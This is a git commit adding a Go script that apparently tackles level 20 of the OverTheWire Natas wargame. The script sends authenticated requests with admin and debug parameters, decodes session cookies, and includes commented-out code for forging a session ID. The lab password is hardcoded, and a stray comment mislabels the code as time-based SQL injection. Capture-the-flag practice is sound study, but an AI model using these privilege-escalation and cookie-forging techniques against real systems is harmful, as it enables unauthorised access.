44ef6746fc7a3549d77a576ddd0176d261cf9153
root <root@localhost.localdomain>
2017-11-16 19:57:42 +0000

    natas 20

---
+++ Natas/natas20/natas20.go
@@ -0,0 +1,81 @@
+package main
+
+import (
+	"bytes"
+	"encoding/base64"
+	"encoding/hex"
+	"fmt"
+	"net/http"
+	"strings"
+)
+
+func main() {
+
+	for index := 0; index < 20; index++ {
+		result("")
+	}
+	/*
+		max := 700
+		for index := 0; index < max; index++ {
+			if result(strconv.Itoa(index)) {
+				break
+			}
+		}
+	*/
+
+}
+
+//SQL Injection time based
+func result(pass string) bool {
+
+	usr := "natas20"
+	psw := "eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF"
+	baseURL := "http://" + usr + ".natas.labs.overthewire.org"
+	query := "?debug=1&admin=1&name=admin"
+
+	client := &http.Client{}
+	req, _ := http.NewRequest("GET",
+		baseURL+query, nil)
+	req.Header.Add("Authorization", "Basic "+basicAuth(usr, psw))
+
+	//cookie := http.Cookie{Name: "PHPSESSID", Value: "abc"}
+	//cookie := http.Cookie{Name: "PHPSESSID", Value: hex.EncodeToString([]byte(pass + "-admin"))}
+	//req.AddCookie(&cookie)
+
+	//start := time.Now()
+	res, _ := client.Do(req)
+	//ellapsed := time.Since(start)
+
+	buf := new(bytes.Buffer)
+	buf.ReadFrom(res.Body)
+	bs := buf.String()
+	//fmt.Println(bs)
+
+	cook := res.Cookies()
+	fmt.Println(cook[0].Value)
+	if len(cook) > 0 {
+		hx, err := hex.DecodeString(cook[0].Value)
+		if err == nil {
+			fmt.Println(string(hx))
+		}
+	}
+	fmt.Print(pass, " ")
+
+	if strings.Contains(bs, "You are an admin") {
+		fmt.Println(bs)
+		return true
+	}
+	return false
+
+}
+
+func basicAuth(username, password string) string {
+	auth := username + ":" + password
+	return base64.StdEncoding.EncodeToString([]byte(auth))
+}
+
+var arr = []string{"0", "1", "2", "3", "4", "5", "6", "7", "8", "9",
+	"A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M",
+	"N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z",
+	"a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m",
+	"n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z"}
